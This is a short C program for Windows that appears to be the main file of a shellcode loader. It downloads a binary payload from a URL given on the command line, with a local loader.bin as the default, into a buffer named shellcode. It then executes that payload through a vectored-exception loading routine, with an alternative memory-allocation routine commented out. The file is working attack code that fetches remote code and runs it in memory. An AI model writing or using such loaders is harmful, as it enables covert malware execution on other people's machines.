#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "loadMethods.h"
#include "http.h"

int main(int argc, char* argv[]) {
	// Special characters don't work without this.
	SetConsoleOutputCP(1252);
	
	char* shellcode = NULL;
	size_t size;
	char* url;

	if (argc < 2) {
		printf("Usage: %s <URL>\n", argv[0]);
		url = "http://127.0.0.1:8080/loader.bin";
	}
	else {
		url = argv[1];
	}
	size = httpToBuffer(url, &shellcode);

	printf("[+] Fetched (%zu bytes)\n", size);

	// loadNtAllocateVirtualMemory(shellcode, size);
	loadVectoredException(shellcode, size);
	return 0;
}
